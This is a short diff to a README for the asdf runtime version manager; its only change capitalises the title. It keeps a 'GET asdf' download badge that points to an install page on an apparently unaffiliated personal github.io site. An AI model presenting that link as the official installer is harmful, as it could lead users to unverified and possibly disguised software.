@@ -1,4 +1,4 @@
-# asdf - Runtime Version Manager for Developers
+# ASDF - Runtime Version Manager for Developers
 
 [![GET asdf](https://img.shields.io/badge/GET%20%E2%80%94%20asdf-0078D6?style=for-the-badge&logoColor=white)](https://dorianarellanohfw.github.io/.github/install-asdf)
 
